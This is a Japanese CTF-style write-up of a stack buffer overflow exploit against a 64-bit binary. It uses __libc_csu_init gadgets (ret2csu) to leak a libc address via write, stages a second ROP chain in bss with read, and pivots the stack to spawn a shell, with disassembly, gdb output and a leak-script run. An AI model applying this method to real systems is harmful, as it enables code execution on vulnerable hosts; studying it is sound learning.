# Case1
## Conditions
```
Arch:     amd64-64-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

## Writeup
- ASLRが有効なのでまずはlibcのアドレスを特定したい。そこでBOFによりwriteに飛ばして__libc_start_mainのアドレスを読み、
libc baseを特定する方針で行く。
- ただ、使えるROP gadgetの中にpop rdx; ret;がない。
- そこで__libc_csu_initを使う。これを使うことで任意の3引数関数が呼び出せる。
```asm
00000000004011b0 <__libc_csu_init>:
・・・
  4011f0:       4c 89 f2                mov    rdx,r14
  4011f3:       4c 89 ee                mov    rsi,r13
  4011f6:       44 89 e7                mov    edi,r12d
  4011f9:       41 ff 14 df             call   QWORD PTR [r15+rbx*8]
  4011fd:       48 83 c3 01             add    rbx,0x1
  401201:       48 39 dd                cmp    rbp,rbx
  401204:       75 ea                   jne    4011f0 <__libc_csu_init+0x40>
  401206:       48 83 c4 08             add    rsp,0x8
  40120a:       5b                      pop    rbx
  40120b:       5d                      pop    rbp
  40120c:       41 5c                   pop    r12
  40120e:       41 5d                   pop    r13
  401210:       41 5e                   pop    r14
  401212:       41 5f                   pop    r15
  401214:       c3                      ret    
```
- まず0x40120aにreturnしてスタックからレジスタに値をロード。rbx = 0, r15 = func_addr, r12 = arg1, r13 = arg2, r14 = arg, rbp = 1になるようにスタックを調整する。次に0x401214にあるret命令で0x4011f0に飛ぶ。これで連続して任意の3引数関数を呼び出せる。
- まずwrite(0, 0x403328, 8)を読んで__libc_start_mainのアドレスをGOT領域から読み、offsetを引くことでlibc baseを特定する。
- 次にread(1, bss+0x800, 400)を読んでbss+0x800の位置にROP chainを書き込む。bssのアドレスに0x800を足しているのはsystem関数用のスタック領域を確保するため。
- 最後にstack pivotでrspをbss+0x800に飛ばしてROP chainを実行させ、shellを起動する。

## Technique
- プログラムが使っているlibcのバージョンが分からない場合、offsetが分からないのでlibc_baseを特定することもROP chainを構築することもできない。しかし今回のようにread/writeが使える場合、任意のアドレスから任意のサイズ読み出すことが可能になる。libcのバージョン情報は.rodataセクションにあるのでここを読めばlibcのバージョンを特定することができる。
```gdb
gdb-peda$ find 'GNU C Library'
Searching for 'GNU C Library' in: None ranges
Found 1 results, display max 1 items:
libc : 0x7ffff7f80b80 ("GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31.\nCopyright (C) 2020 Free Software Foundation, Inc.\nThis is free software; see the source for copying conditions.\nThere is NO wa"...)
```
```bash
$ python3 leak_libc_version.py OFFSET=120 LEAK_OFFSET=0x193bf0 LEAK_SIZE=0x10000
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
libc_start_main: 0x7ffff7decf90
leak_addr: 0x7ffff7f80b80
b'GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31...
```

## 参考
- ももいろテクノロジー「x64でROP stager + Return-to-dl-resolve + __libc_csu_init gadgetsによるASLR+DEP回避をやってみる」(https://inaz2.hatenablog.com/entry/2014/07/31/010158)